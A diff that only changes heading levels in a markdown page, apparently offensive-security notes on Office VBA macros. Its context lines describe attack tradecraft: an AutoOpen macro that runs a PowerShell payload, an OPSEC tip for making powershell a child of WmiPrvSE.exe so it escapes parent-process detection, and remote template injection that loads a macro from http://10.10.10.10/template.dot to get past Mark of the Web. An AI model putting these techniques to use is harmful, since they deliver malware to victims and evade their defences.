@@ -2,7 +2,7 @@
 title: Microsoft Office Macros
 ---
 
-# Visual Basic for Applications (VBA) Macro
+## Visual Basic for Applications (VBA) Macro
 
 VBA is an implementation of Visual Basic that is very widely used with Microsoft Office applications - often used to enhance or augment functionality in Word and Excel for data processing etc. 
 
@@ -31,7 +31,7 @@ End Sub
 
 > **Note**: To force the macro to trigger automatically when the document is opened, use the name`AutoOpen()`.
 
-## Executing a Powershell Payload
+### Executing a Powershell Payload
 
 ```
 Sub AutoOpen()
@@ -43,7 +43,7 @@ Sub AutoOpen()
 End Sub
 ```
 
-# Changing Prent-Child Relationship
+## Changing Prent-Child Relationship
 
 When a powershell is executed from a word macro a child `powershell.exe` process is created from `winword.exe` (MS Word as a Parent). This isn't normal behaviour and highly suspicious.
 
@@ -60,7 +60,7 @@ proc.Create "powershell"
 > **OPSEC Note**: In that case, powershell will be a child of `WmiPrvSE.exe` rather than MS Word.
 
 
-# Remote Template Injection
+## Remote Template Injection
 
 
 Microsoft Word has the option of creating a new document from a template. Office has some templates pre-installed. Remote template injection is a technique where an attacker sends a benign document to a victim, which downloads and loads a malicious script.
@@ -75,7 +75,7 @@ Target="http://10.10.10.10/template.dot"
 This will allow to execute the macro even if its flagged with MOTW.
 
 
-# Downloading and executing a file
+## Downloading and executing a file
 
 There are different ways to execute a binary.
 
